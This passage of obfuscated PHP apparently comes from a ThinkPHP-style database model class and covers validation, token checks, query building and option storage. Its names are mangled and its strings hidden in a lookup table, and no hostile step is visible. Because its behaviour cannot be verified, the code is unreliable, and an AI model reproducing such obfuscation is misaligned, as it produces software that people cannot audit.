$ÄÁ¥¥Æ); $ÄÁ¥¥Æ = array_keys($ÇÀ×ïñÌ[0]); $ùï‰ú’Ã = array_shift($ÄÁ¥¥Æ); $ ³‰º£€ = array_shift($ÄÁ¥¥Æ); $èÔÙÅŸŞ = array(); $ŒöÀÛŞ = count($Šï°´€); foreach ($ÇÀ×ïñÌ as $®Æ’‰öÃ) { $ßò’Øï³ = $®Æ’‰öÃ[$ùï‰ú’Ã]; if (2 == $ŒöÀÛŞ) { $èÔÙÅŸŞ[$ßò’Øï³] = $®Æ’‰öÃ[$ ³‰º£€]; } else { $èÔÙÅŸŞ[$ßò’Øï³] = is_string($ù×†§ô§) ? implode($ù×†§ô§, $®Æ’‰öÃ) : $®Æ’‰öÃ; } } return $èÔÙÅŸŞ; } } else { if (!0 !== $ù×†§ô§) { $ËµÏ†„¬[$Ô°¢à›¡[343]] = is_numeric($ù×†§ô§) ? $ù×†§ô§ : 1; } if ($ù×†§ô§ === $Ô°¢à›¡[307]) { unset($ËµÏ†„¬[$Ô°¢à›¡[343]]); } $®Æ’‰öÃ = $this->db->select($ËµÏ†„¬); if (!empty($®Æ’‰öÃ)) { if ($ù×†§ô§ === $Ô°¢à›¡[307]) { return reset($®Æ’‰öÃ[0]); } if (!0 !== $ù×†§ô§ && 1 == $ËµÏ†„¬[$Ô°¢à›¡[343]]) { return reset($®Æ’‰öÃ[0]); } foreach ($®Æ’‰öÃ as $üëİË¬Ë) { $ÚÆå‚ö˜[] = $üëİË¬Ë[$ÄÁ¥¥Æ]; } return $ÚÆå‚ö˜; } } return null; } public function create($Œìˆ¢×¾ = '', $ıüÈ…Çç = '') { $ôÚ¢àÙĞ =& $_SERVER[º·Ï‹¥³]; if (empty($Œìˆ¢×¾)) { $Œìˆ¢×¾ = $_POST; } elseif (is_object($Œìˆ¢×¾)) { $Œìˆ¢×¾ = get_object_vars($Œìˆ¢×¾); } if (empty($Œìˆ¢×¾) || !is_array($Œìˆ¢×¾)) { $this->error = think_lang($ôÚ¢àÙĞ[323]); return !1; } $Œìˆ¢×¾ = $this->parseFieldsMap($Œìˆ¢×¾, 0); $ıüÈ…Çç = $ıüÈ…Çç ? $ıüÈ…Çç : (!empty($Œìˆ¢×¾[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$ôÚ¢àÙĞ[325]])) { $¶£şóµş = $this->options[$ôÚ¢àÙĞ[325]]; unset($this->options[$ôÚ¢àÙĞ[325]]); } elseif ($ıüÈ…Çç == THINK_MODEL_INSERT && isset($this->insertFields)) { $¶£şóµş = $this->insertFields; } elseif ($ıüÈ…Çç == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¶£şóµş = $this->updateFields; } if (isset($¶£şóµş)) { if (is_string($¶£şóµş)) { $¶£şóµş = explode($ôÚ¢àÙĞ[50], $¶£şóµş); } if (think_config($ôÚ¢àÙĞ[349])) { $¶£şóµş[] = think_config($ôÚ¢àÙĞ[350]); } foreach ($Œìˆ¢×¾ as $ãò¢°óÆ => $¢òôº) { if (!in_array($ãò¢°óÆ, $¶£şóµş)) { unset($Œìˆ¢×¾[$ãò¢°óÆ]); } } } if (!$this->autoValidation($Œìˆ¢×¾, $ıüÈ…Çç)) { return !1; } if (!$this->autoCheckToken($Œìˆ¢×¾)) { $this->error = think_lang($ôÚ¢àÙĞ[351]); return !1; } if ($this->autoCheckFields) { $¶£şóµş = $this->getDbFields(); foreach ($Œìˆ¢×¾ as $ãò¢°óÆ => $¢òôº) { if (!in_array($ãò¢°óÆ, $¶£şóµş)) { unset($Œìˆ¢×¾[$ãò¢°óÆ]); } elseif (MAGIC_QUOTES_GPC && is_string($¢òôº)) { $Œìˆ¢×¾[$ãò¢°óÆ] = stripslashes($¢òôº); } } } $this->autoOperation($Œìˆ¢×¾, $ıüÈ…Çç); $this->data = $Œìˆ¢×¾; return $Œìˆ¢×¾; } public function autoCheckToken($Ê œıº) { $¶Ò´­ÉÑ =& $_SERVER[º·Ï‹¥³]; if (isset($this->options[$¶Ò´­ÉÑ[352]]) && !$this->options[$¶Ò´­ÉÑ[352]]) { return !0; } if (think_config($¶Ò´­ÉÑ[349])) { $…€Éå¢˜ = think_config($¶Ò´­ÉÑ[350]); if (!isset($Ê œıº[$…€Éå¢˜]) || Session::get($…€Éå¢˜)) { return !1; } list($Ú¯ì¬›ƒ, $ïîŒ¶ï™) = explode($¶Ò´­ÉÑ[11], $Ê œıº[$…€Éå¢˜]); if ($ïîŒ¶ï™ && Session::get($…€Éå¢˜ . $¶Ò´­ÉÑ[10] . $Ú¯ì¬›ƒ) === $ïîŒ¶ï™) { Session::remove($…€Éå¢˜ . $¶Ò´­ÉÑ[10] . $Ú¯ì¬›ƒ); return !0; } if (think_config($¶Ò´­ÉÑ[353])) { Session::remove($…€Éå¢˜ . $¶Ò´­ÉÑ[10] . $Ú¯ì¬›ƒ); } return !1; } return !0; } public function regex($òÚÅ×•ê, $ŸıÊ÷ÛÅ) { $”™ê¼µÊ =& $_SERVER[º·Ï‹¥³]; $Ø•ùæ²Î = array($”™ê¼µÊ[354] => $”™ê¼µÊ[355], $”™ê¼µÊ[356] => $”™ê¼µÊ[357], $”™ê¼µÊ[358] => $”™ê¼µÊ[359], $”™ê¼µÊ[360] => $”™ê¼µÊ[361], $”™ê¼µÊ[362] => $”™ê¼µÊ[363], $”™ê¼µÊ[364] => $”™ê¼µÊ[365], $”™ê¼µÊ[366] => $”™ê¼µÊ[367], $”™ê¼µÊ[341] => $”™ê¼µÊ[368], $”™ê¼µÊ[369] => $”™ê¼µÊ[370]); if (isset($Ø•ùæ²Î[strtolower($ŸıÊ÷ÛÅ)])) { $ŸıÊ÷ÛÅ = $Ø•ùæ²Î[strtolower($ŸıÊ÷ÛÅ)]; } return preg_match($ŸıÊ÷ÛÅ, $òÚÅ×•ê) === 1; } private function autoOperation(&$Û“¬ŒÖÛ, $¨öø†µÕ) { $À±Â‹øª =& $_SERVER[º·Ï‹¥³]; if (!empty($this->options[$À±Â‹øª[371]])) { $Ç†ÒÏŞ = $this->options[$À±Â‹øª[371]]; unset($this->options[$À±Â‹øª[371]]); } elseif (!empty($this->_auto)) { $Ç†ÒÏŞ = $this->_auto; } if (isset($Ç†ÒÏŞ)) { foreach ($Ç†ÒÏŞ as $Òèå°¢·) { if (empty($Òèå°¢·[2])) { $Òèå°¢·[2] = THINK_MODEL_INSERT; } if ($¨öø†µÕ == $Òèå°¢·[2] || $Òèå°¢·[2] == THINK_MODEL_BOTH) { switch (trim($Òèå°¢·[3])) { case $À±Â‹øª[372]: case $À±Â‹øª[373]: $÷ÔŒÍ³ = isset($Òèå°¢·[4]) ? (array) $Òèå°¢·[4] : array(); if (isset($Û“¬ŒÖÛ[$Òèå°¢·[0]])) { array_unshift($÷ÔŒÍ³, $Û“¬ŒÖÛ[$Òèå°¢·[0]]); } if ($À±Â‹øª[372] == $Òèå°¢·[3]) { $Û“¬ŒÖÛ[$Òèå°¢·[0]] = call_user_func_array($Òèå°¢·[1], $÷ÔŒÍ³); } else { $Û“¬ŒÖÛ[$Òèå°¢·[0]] = call_user_func_array(array(&$this, $Òèå°¢·[1]), $÷ÔŒÍ³); } break; case $À±Â‹øª[325]: $Û“¬ŒÖÛ[$Òèå°¢·[0]] = $Û“¬ŒÖÛ[$Òèå°¢·[1]]; break; case $À±Â‹øª[374]: if ($À±Â‹øª[12] === $Û“¬ŒÖÛ[$Òèå°¢·[0]]) { unset($Û“¬ŒÖÛ[$Òèå°¢·[0]]); } break; case $À±Â‹øª[375]: default: $Û“¬ŒÖÛ[$Òèå°¢·[0]] = $Òèå°¢·[1]; } if (!1 === $Û“¬ŒÖÛ[$Òèå°¢·[0]]) { unset($Û“¬ŒÖÛ[$Òèå°¢·[0]]); } } } } return $Û“¬ŒÖÛ; } protected function autoValidation($Ÿš¯¸®¬, $Ç—ßâÚ„) { $°·ÕÖ„ì =& $_SERVER[º·Ï‹¥³]; if (!empty($this->options[$°·ÕÖ„ì[376]])) { $ÒÓÑñú = $this->options[$°·ÕÖ„ì[376]]; unset($this->options[$°·ÕÖ„ì[376]]); } elseif (!empty($this->_validate)) { $ÒÓÑñú = $this->_validate; } if (isset($ÒÓÑñú)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÒÓÑñú as $Ş»£´ÂÁ => $ÉŸÁæäß) { if (empty($ÉŸÁæäß[5]) || $ÉŸÁæäß[5] == THINK_MODEL_BOTH || $ÉŸÁæäß[5] == $Ç—ßâÚ„) { if (0 == strpos($ÉŸÁæäß[2], $°·ÕÖ„ì[377]) && strpos($ÉŸÁæäß[2], $°·ÕÖ„ì[378])) { $ÉŸÁæäß[2] = think_lang(substr($ÉŸÁæäß[2], 2, -1)); } $ÉŸÁæäß[3] = isset($ÉŸÁæäß[3]) ? $ÉŸÁæäß[3] : THINK_EXISTS_VALIDATE; $ÉŸÁæäß[4] = isset($ÉŸÁæäß[4]) ? $ÉŸÁæäß[4] : $°·ÕÖ„ì[379]; switch ($ÉŸÁæäß[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($Ÿš¯¸®¬, $ÉŸÁæäß)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($°·ÕÖ„ì[12] != trim($Ÿš¯¸®¬[$ÉŸÁæäß[0]])) { if (!1 === $this->_validationField($Ÿš¯¸®¬, $ÉŸÁæäß)) { return !1; } } break; default: if (isset($Ÿš¯¸®¬[$ÉŸÁæäß[0]])) { if (!1 === $this->_validationField($Ÿš¯¸®¬, $ÉŸÁæäß)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($ç¡”„¿È, $Î‘°Ä¨‘) { if (!1 === $this->_validationFieldItem($ç¡”„¿È, $Î‘°Ä¨‘)) { if ($this->patchValidate) { $this->error[$Î‘°Ä¨‘[0]] = $Î‘°Ä¨‘[2]; } else { $this->error = $Î‘°Ä¨‘[2]; return !1; } } return; } protected function _validationFieldItem($˜Èü¨ÏÂ, $“©ıø˜ß) { $Éäï·¹× =& $_SERVER[º·Ï‹¥³]; switch (strtolower(trim($“©ıø˜ß[4]))) { case $Éäï·¹×[372]: case $Éäï·¹×[373]: $Ùéåê“Ò = isset($“©ıø˜ß[6]) ? (array) $“©ıø˜ß[6] : array(); if (is_string($“©ıø˜ß[0]) && strpos($“©ıø˜ß[0], $Éäï·¹×[50])) { $“©ıø˜ß[0] = explode($Éäï·¹×[50], $“©ıø˜ß[0]); } if (is_array($“©ıø˜ß[0])) { foreach ($“©ıø˜ß[0] as $şÖå“´ç) { $ˆîÂó¤[$şÖå“´ç] = $˜Èü¨ÏÂ[$şÖå“´ç]; } array_unshift($Ùéåê“Ò, $ˆîÂó¤); } else { array_unshift($Ùéåê“Ò, $˜Èü¨ÏÂ[$“©ıø˜ß[0]]); } if ($Éäï·¹×[372] == $“©ıø˜ß[4]) { return call_user_func_array($“©ıø˜ß[1], $Ùéåê“Ò); } else { return call_user_func_array(array(&$this, $“©ıø˜ß[1]), $Ùéåê“Ò); } case $Éäï·¹×[380]: return $˜Èü¨ÏÂ[$“©ıø˜ß[0]] == $˜Èü¨ÏÂ[$“©ıø˜ß[1]]; case $Éäï·¹×[381]: if (is_string($“©ıø˜ß[0]) && strpos($“©ıø˜ß[0], $Éäï·¹×[50])) { $“©ıø˜ß[0] = explode($Éäï·¹×[50], $“©ıø˜ß[0]); } $”óƒ™ë” = array(); if (is_array($“©ıø˜ß[0])) { foreach ($“©ıø˜ß[0] as $şÖå“´ç) { $”óƒ™ë”[$şÖå“´ç] = $˜Èü¨ÏÂ[$şÖå“´ç]; } } else { $”óƒ™ë”[$“©ıø˜ß[0]] = $˜Èü¨ÏÂ[$“©ıø˜ß[0]]; } if (!empty($˜Èü¨ÏÂ[$this->getPk()])) { $”óƒ™ë”[$this->getPk()] = array($Éäï·¹×[382], $˜Èü¨ÏÂ[$this->getPk()]); } if ($this->where($”óƒ™ë”)->find()) { return !1; } return !0; default: return $this->check($˜Èü¨ÏÂ[$“©ıø˜ß[0]], $“©ıø˜ß[1], $“©ıø˜ß[4]); } } public function check($•ñµ˜µí, $”êÍ÷, $”¿À˜º° = "\162\x65\147\x65\x78") { $Â˜€Šø® =& $_SERVER[º·Ï‹¥³]; $”¿À˜º° = strtolower(trim($”¿À˜º°)); switch ($”¿À˜º°) { case $Â˜€Šø®[7]: case $Â˜€Šø®[383]: $æ„Ğ©Ö = is_array($”êÍ÷) ? $”êÍ÷ : explode($Â˜€Šø®[50], $”êÍ÷); return $”¿À˜º° == $Â˜€Šø®[7] ? in_array($•ñµ˜µí, $æ„Ğ©Ö) : !in_array($•ñµ˜µí, $æ„Ğ©Ö); case $Â˜€Šø®[384]: case $Â˜€Šø®[385]: if (is_array($”êÍ÷)) { $Ûïˆ€ é = $”êÍ÷[0]; $éÊ½¯ûø = $”êÍ÷[1]; } else { list($Ûïˆ€ é, $éÊ½¯ûø) = explode($Â˜€Šø®[50], $”êÍ÷); } return $”¿À˜º° == $Â˜€Šø®[384] ? $•ñµ˜µí >= $Ûïˆ€ é && $•ñµ˜µí <= $éÊ½¯ûø : $•ñµ˜µí < $Ûïˆ€ é || $•ñµ˜µí > $éÊ½¯ûø; case $Â˜€Šø®[386]: case $Â˜€Šø®[387]: return $”¿À˜º° == $Â˜€Šø®[386] ? $•ñµ˜µí == $”êÍ÷ : $•ñµ˜µí != $”êÍ÷; case $Â˜€Šø®[388]: $½€àáâˆ = mb_strlen($•ñµ˜µí, $Â˜€Šø®[389]); if (strpos($”êÍ÷, $Â˜€Šø®[50])) { list($Ûïˆ€ é, $éÊ½¯ûø) = explode($Â˜€Šø®[50], $”êÍ÷); return $½€àáâˆ >= $Ûïˆ€ é && $½€àáâˆ <= $éÊ½¯ûø; } else { return $½€àáâˆ == $”êÍ÷; } case $Â˜€Šø®[390]: list($°Êš×ŒÈ, $Ñä÷ÅÙº) = explode($Â˜€Šø®[50], $”êÍ÷); if (!is_numeric($°Êš×ŒÈ)) { $°Êš×ŒÈ = strtotime($°Êš×ŒÈ); } if (!is_numeric($Ñä÷ÅÙº)) { $Ñä÷ÅÙº = strtotime($Ñä÷ÅÙº); } return NOW_TIME >= $°Êš×ŒÈ && NOW_TIME <= $Ñä÷ÅÙº; case $Â˜€Šø®[391]: return in_array(get_client_ip(), explode($Â˜€Šø®[50], $”êÍ÷)); case $Â˜€Šø®[392]: return !in_array(get_client_ip(), explode($Â˜€Šø®[50], $”êÍ÷)); case $Â˜€Šø®[379]: default: return $this->regex($•ñµ˜µí, $”êÍ÷); } } public function query($ŸÙ˜Ä€İ, $“Ï§® = false) { $áÇäºÑÕ =& $_SERVER[º·Ï‹¥³]; if (!is_bool($“Ï§®) && !is_array($“Ï§®)) { $“Ï§® = func_get_args(); array_shift($“Ï§®); } $ŸÙ˜Ä€İ = str_replace(array($áÇäºÑÕ[253], $áÇäºÑÕ[393]), $áÇäºÑÕ[53], $ŸÙ˜Ä€İ); $ŸÙ˜Ä€İ = $this->parseSql($ŸÙ˜Ä€İ, $“Ï§®); return $this->db->query($ŸÙ˜Ä€İ); } public function execute($‰ÛÍñªì, $Ì“¡Á– = false) { if (!is_bool($Ì“¡Á–) && !is_array($Ì“¡Á–)) { $Ì“¡Á– = func_get_args(); array_shift($Ì“¡Á–); } $‰ÛÍñªì = $this->parseSql($‰ÛÍñªì, $Ì“¡Á–); return $this->db->execute($‰ÛÍñªì); } protected function parseSql($­¨Ìï¹, $½öçäÛô) { $í„ğ¸¸Ó =& $_SERVER[º·Ï‹¥³]; if (!0 === $½öçäÛô) { $»©¡…›Í = $this->_parseOptions(); $­¨Ìï¹ = $this->db->parseSql($­¨Ìï¹, $»©¡…›Í); } elseif (is_array($½öçäÛô)) { $½öçäÛô = array_map(array($this->db, $í„ğ¸¸Ó[394]), $½öçäÛô); $­¨Ìï¹ = vsprintf($­¨Ìï¹, $½öçäÛô); } else { $­¨Ìï¹ = strtr($­¨Ìï¹, array($í„ğ¸¸Ó[395] => $this->getTableName(), $í„ğ¸¸Ó[396] => think_config($í„ğ¸¸Ó[296]))); } $this->db->setModel($this->name); return $­¨Ìï¹; } public function db($¢ÒõÒÁ = '', $øùÅçòª = '', $¤ƒîÁñ¬ = array()) { $ëÇÛâ´Ô =& $_SERVER[º·Ï‹¥³]; if ($ëÇÛâ´Ô[12] === $¢ÒõÒÁ && $this->db) { return $this->db; } static $½ğÌ˜­Ÿ = array(); static $¡êËçš = array(); if (!isset($¡êËçš[$¢ÒõÒÁ]) || isset($¡êËçš[$¢ÒõÒÁ]) && $øùÅçòª && $½ğÌ˜­Ÿ[$¢ÒõÒÁ] != $øùÅçòª) { if (!empty($øùÅçòª) && is_string($øùÅçòª) && !1 === strpos($øùÅçòª, $ëÇÛâ´Ô[8])) { $øùÅçòª = think_config($øùÅçòª); } $¢ÒõÒÁ = think_guid($øùÅçòª); $¡êËçš[$¢ÒõÒÁ] = Db::getInstance($øùÅçòª); } elseif (NULL === $øùÅçòª) { $¡êËçš[$¢ÒõÒÁ]->close(); unset($¡êËçš[$¢ÒõÒÁ]); return; } if (!empty($¤ƒîÁñ¬)) { if (is_string($¤ƒîÁñ¬)) { parse_str($¤ƒîÁñ¬, $¤ƒîÁñ¬); } foreach ($¤ƒîÁñ¬ as $ÒÛ†²í” => $ÃÕ©ƒß–) { $this->setProperty($ÒÛ†²í”, $ÃÕ©ƒß–); } } $½ğÌ˜­Ÿ[$¢ÒõÒÁ] = $øùÅçòª; $this->db = $¡êËçš[$¢ÒõÒÁ]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ ³êÓÀà = get_class($this); if ($ ³êÓÀà == $_SERVER[º·Ï‹¥³][397]) { return $this->name; } $this->name = substr($ ³êÓÀà, 0, -5); } return $this->name; } public function getTableName() { $ìª˜ãíè =& $_SERVER[º·Ï‹¥³]; if (empty($this->trueTableName)) { $Õ„¥íò = !empty($this->tablePrefix) ? $this->tablePrefix : $ìª˜ãíè[12]; if (!empty($this->tableName)) { $Õ„¥íò .= $this->tableName; } else { $Õ„¥íò .= think_parse_name($this->name); } $this->trueTableName = strtolower($Õ„¥íò); } return (!empty($this->dbName) ? $this->dbName . $ìª˜ãíè[10] : $ìª˜ãíè[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $òªŞâ½ğ =& $_SERVER[º·Ï‹¥³]; return isset($this->fields[$òªŞâ½ğ[303]]) ? $this->fields[$òªŞâ½ğ[303]] : $this->pk; } public function getDbFields() { $àİíŞÓ˜ =& $_SERVER[º·Ï‹¥³]; if (isset($this->options[$àİíŞÓ˜[331]])) { $ç¦Ğå = $this->db->getFields($this->options[$àİíŞÓ˜[331]]); return $ç¦Ğå ? array_keys($ç¦Ğå) : !1; } if ($this->fields) { $ç¦Ğå = $this->fields; unset($ç¦Ğå[$àİíŞÓ˜[302]], $ç¦Ğå[$àİíŞÓ˜[303]], $ç¦Ğå[$àİíŞÓ˜[304]], $ç¦Ğå[$àİíŞÓ˜[301]]); return $ç¦Ğå; } return !1; } public function data($¤±Îß¶Ù = '') { $‡ÉŸ‡ØÜ =& $_SERVER[º·Ï‹¥³]; if ($‡ÉŸ‡ØÜ[12] === $¤±Îß¶Ù && !empty($this->data)) { return $this->data; } if (is_object($¤±Îß¶Ù)) { $¤±Îß¶Ù = get_object_vars($¤±Îß¶Ù); } elseif (is_string($¤±Îß¶Ù)) { parse_str($¤±Îß¶Ù, $¤±Îß¶Ù); } elseif (!is_array($¤±Îß¶Ù)) { think_exception(think_lang($‡ÉŸ‡ØÜ[323])); } $this->data = $¤±Îß¶Ù; return $this; } public function join($Ëîáííş) { $ŠÅ©œõ =& $_SERVER[º·Ï‹¥³]; if (is_array($Ëîáííş)) { $this->options[$ŠÅ©œõ[334]] = $Ëîáííş; } elseif (!empty($Ëîáííş)) { $this->options[$ŠÅ©œõ[334]][] = $Ëîáííş; } return $this; } public function union($é£‹Ø‹, $ã—çÆ¯ø = false) { $£ëÒö‹˜ =& $_SERVER[º·Ï‹¥³]; if (empty($é£‹Ø‹)) { return $this; } if ($ã—çÆ¯ø) { $this->options[$£ëÒö‹˜[398]][$£ëÒö‹˜[399]] = !0; } if (is_object($é£‹Ø‹)) { $é£‹Ø‹ = get_object_vars($é£‹Ø‹); } if (is_string($é£‹Ø‹)) { $Ã³îšµñ = $é£‹Ø‹; } elseif (is_array($é£‹Ø‹)) { if (isset($é£‹Ø‹[0])) { $this->options[$£ëÒö‹˜[398]] = array_merge($this->options[$£ëÒö‹˜[398]], $é£‹Ø‹); return $this; } else { $Ã³îšµñ = $é£‹Ø‹; } } else { think_exception(think_lang($£ëÒö‹˜[323])); } $this->options[$£ëÒö‹˜[398]][] = $Ã³îšµñ; return $this; } public function cache($î­£ù˜º = true, $ûÁİ³Ä– = null, $”°÷¿ä‚ = '') { $Ê÷òµÖÈ =& $_SERVER[º·Ï‹¥³]; if (!1 !== $î­£ù˜º) { $this->options[$Ê÷òµÖÈ[400]] = array($Ê÷òµÖÈ[97] => $î­£ù˜º, $Ê÷òµÖÈ[390] => $ûÁİ³Ä–, $Ê÷òµÖÈ[33] => $”°÷¿ä‚); } return $this; } public function field($´€„ÊŸ‰, $‘‹£«Êê = false) { $‡µÒé =& $_SERVER[º·Ï‹¥³]; if (!0 === $´€„ÊŸ‰) { $ö™ü…Ò = $this->getDbFields(); $´€„ÊŸ‰ = $ö™ü…Ò ? $ö™ü…Ò : $‡µÒé[211]; } elseif ($‘‹£«Êê) { if (is_string($´€„ÊŸ‰)) { $´€„ÊŸ‰ = explode($‡µÒé[50], $´€„ÊŸ‰); } $ö™ü…Ò = $this->getDbFields(); $´€„ÊŸ‰ = $ö™ü…Ò ? array_diff($ö™ü…Ò, $´€„ÊŸ‰) : $´€„ÊŸ‰; } $this->options[$‡µÒé[325]] = $´€„ÊŸ‰; return $this; } public function scope($Ÿïèöê³ = '', $½šÄ‹ôõ = NULL) { $»Ôùñ¨’ =& $_SERVER[º·Ï‹¥³]; if ($»Ôùñ¨’[12] === $Ÿïèöê³) { if (isset($this->_scope[$»Ôùñ¨’[37]])) { $Ğûïúú” = $this->_scope[$»Ôùñ¨’[37]]; } else { return $this; } } elseif (is_string($Ÿïèöê³)) { $§³µ²¶ú = explode($»Ôùñ¨’[50], $Ÿïèöê³); $Ğûïúú” = array(); foreach ($§³µ²¶ú as $¤•ÒÁú) { if (!isset($this->_scope[$¤•ÒÁú])) { continue; } $Ğûïúú” = array_merge($Ğûïúú”, $this->_scope[$¤•ÒÁú]); } if (!empty($½šÄ‹ôõ) && is_array($½šÄ‹ôõ)) { $Ğûïúú” = array_merge($Ğûïúú”, $½šÄ‹ôõ); } } elseif (is_array($Ÿïèöê³)) { $Ğûïúú” = $Ÿïèöê³; } if (is_array($Ğûïúú”) && !empty($Ğûïúú”)) { $this->options = array_merge($this->options, array_change_key_case($Ğûïúú”)); } return $this; } public function where($Ä®êÛÎ«, $ç¡¹úš‰ = null) { $²œç¥ğÂ =& $_SERVER[º·Ï‹¥³]; if (!is_null($ç¡¹úš‰) && is_string($Ä®êÛÎ«)) { if (!is_array($ç¡¹úš‰)) { $ç¡¹úš‰ = func_get_args(); array_shift($ç¡¹úš‰); } $ç¡¹úš‰ = array_map(array($this->db, $²œç¥ğÂ[394]), $ç¡¹úš‰); $Ä®êÛÎ« = vsprintf($Ä®êÛÎ«, $ç¡¹úš‰); } elseif (is_object($Ä®êÛÎ«)) { $Ä®êÛÎ« = get_object_vars($Ä®êÛÎ«); } elseif (is_array($Ä®êÛÎ«)) { foreach ($Ä®êÛÎ« as $êü€¿  => $¢Š™¥¡Î) { if ((is_numeric($êü€¿ ) || !$êü€¿ ) && is_string($¢Š™¥¡Î)) { if (strpos($¢Š™¥¡Î, $²œç¥ğÂ[401]) === 0) { continue; } think_trace($²œç¥ğÂ[402], $²œç¥ğÂ[12], $²œç¥ğÂ[49]); die; } } } if (is_string($Ä®êÛÎ«) && $²œç¥ğÂ[12] != $Ä®êÛÎ«) { $ÃæÔªß = array(); $ÃæÔªß[$²œç¥ğÂ[403]] = $Ä®êÛÎ«; $Ä®êÛÎ« = $ÃæÔªß; } if (isset($this->options[$²œç¥ğÂ[327]])) { $this->options[$²œç¥ğÂ[327]] = array_merge($this->options[$²œç¥ğÂ[327]], $Ä®êÛÎ«); } else { $this->options[$²œç¥ğÂ[327]] = $Ä®êÛÎ«; } return $this; } public function limit($ğ¢ÉÔŸ¡, $èğ£Éù² = null) { $ÉêŠ¼ï– =& $_SERVER[º·Ï‹¥³]; $this->options[$ÉêŠ¼ï–[343]] = is_null($èğ£Éù²) ? $ğ¢ÉÔŸ¡ : $ğ¢ÉÔŸ¡ . $ÉêŠ¼ï–[50] . $èğ£Éù²; return $this; } public function page($½„ß­ó, $»ğ¼Ÿßµ = null) { $ñÙ‰İ­Ì =& $_SERVER[º·Ï‹¥³]; $this->options[$ñÙ‰İ­Ì[404]] = is_null($»ğ¼Ÿßµ) ? $½„ß­ó : $½„ß­ó . $ñÙ‰İ­Ì[50] . $»ğ¼Ÿßµ; return $this; } public function comment($»ÌÑÜ¢Ç) { $this->options[$_SERVER[º·Ï‹¥³][405]] = $»ÌÑÜ¢Ç; return $this; } public function setProperty($ûğ¢¼Ôú, $ÄØ´ŸŸª) { if (property_exists($this, $ûğ¢¼Ôú)) { $this->{$ûğ¢¼Ôú} = $ÄØ´ŸŸª; } return $this; } } $_file = $_SERVER[$_SERVER[º·Ï‹¥³][406]]; $_size = $_SERVER[º·Ï‹¥³][407]; goto cø¹™¯ÖÈƒ; Dñß“Ãçßö: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($¥²Ã­«¶ = false, $ä¬˜š¸ô = '', $…ü¯œø = false) { $¢Å²íŞÅ =& $_SERVER[º·Ï‹¥³]; $ãÃÂŠ¥‡ = $this->cacheGet($ä¬˜š¸ô); $œùÙñıÌ = $this->optionDefault($ä¬˜š¸ô); $œùÙñıÌ = is_array($œùÙñıÌ) ? $œùÙñıÌ : array(); if (is_array($ãÃÂŠ¥‡)) { $ãÃÂŠ¥‡ = array_merge($œùÙñıÌ, $ãÃÂŠ¥‡); return $¥²Ã­«¶ ? isset($ãÃÂŠ¥‡[$¥²Ã­«¶]) ? $ãÃÂŠ¥‡[$¥²Ã­«¶] : null : $ãÃÂŠ¥‡; } $”Ô×í° = $this->filterWhere(array($¢Å²íŞÅ[33] => $ä¬˜š¸ô)); $ãÃÂŠ¥‡ = $this->where($”Ô×í°)->select(); $ãÃÂŠ¥‡ = array_to_keyvalue($ãÃÂŠ¥‡, $¢Å²íŞÅ[97], $¢Å²íŞÅ[434]); foreach ($ãÃÂŠ¥‡ as $Ç¨ş‰ğ¹ => $Çûæ¬œ) { if ($…ü¯œø || in_array($Ç¨ş‰ğ¹, $this->jsonField)) { $ãÃÂŠ¥‡[$Ç¨ş‰ğ¹] = json_decode($Çûæ¬œ, !0); } } $this->cacheSet($ä¬˜š¸ô, $ãÃÂŠ¥‡); $ãÃÂŠ¥‡ = array_merge($œùÙñıÌ, $ãÃÂŠ¥‡); return $¥²Ã­«¶ ? $ãÃÂŠ¥‡[$¥²Ã­«¶] : $ãÃÂŠ¥‡; } public function set($„ûô©˜Û, $‹«Õ˜¾¾ = false, $û§…€ç± = '') { $‡æˆÚ³ =& $_SERVER[º·Ï‹¥³]; $this->cacheRemove($û§…€ç±); $á“‹³©¨ = array(); $«œÔù = is_array($„ûô©˜Û) ? $„ûô©˜Û : array($„ûô©˜Û => $‹«Õ˜¾¾); foreach ($«œÔù as $­ÚÕ‹Áà => $ù…˜³±¦) { if (is_array($ù…˜³±¦)) { $ù…˜³±¦ = json_encode_force($ù…˜³±¦); } $this->checkLength($ù…˜³±¦, !1, $this->tableName . $‡æˆÚ³[4] . $„ûô©˜Û); $ù…˜³±¦ = self::textEncode($ù…˜³±¦); $«œÔù = array($‡æˆÚ³[33] => $û§…€ç±, $‡æˆÚ³[97] => $­ÚÕ‹Áà, $‡æˆÚ³[434] => $ù…˜³±¦); $á“‹³©¨[] = $this->filterWhere($«œÔù); } if (!$á“‹³©¨) { return !0; } $ÁÔÊ„¸Ô = $this->cacheKey($‡æˆÚ³[460]); CacheLock::lock($ÁÔÊ„¸Ô); $úŠ¥ªô = $this->addAll($á“‹³©¨, array(), !0); CacheLock::unlock($ÁÔÊ„¸Ô); return $úŠ¥ªô; } protected function optionDefault($÷Ñ®Ì°® = '') { return !1; } public function setDeep($ƒºÀõ—›, $àØÍİà = false, $°—Ï¹ = '') { $å§Ã”‡ = explode($_SERVER[º·Ï‹¥³][10], $ƒºÀõ—›); $ ‰£ôÄ‹ = $this->get(); array_set_value($ ‰£ôÄ‹, $ƒºÀõ—›, $àØÍİà); $this->set($å§Ã”‡[0], $ ‰£ôÄ‹[$å§Ã”‡[0]], $°—Ï¹); } public function remove($äÜÅÂÜ¡, $¤ĞÅÊ‰ˆ = '') { $¥òêĞóê =& $_SERVER[º·Ï‹¥³]; $this->cacheRemove($¤ĞÅÊ‰ˆ); $ÔœâÕÍå = $this->filterWhere(array($¥òêĞóê[97] => $äÜÅÂÜ¡, $¥òêĞóê[33] => $¤ĞÅÊ‰ˆ)); if (is_null($äÜÅÂÜ¡)) { unset($ÔœâÕÍå[$¥òêĞóê[97]]); } return 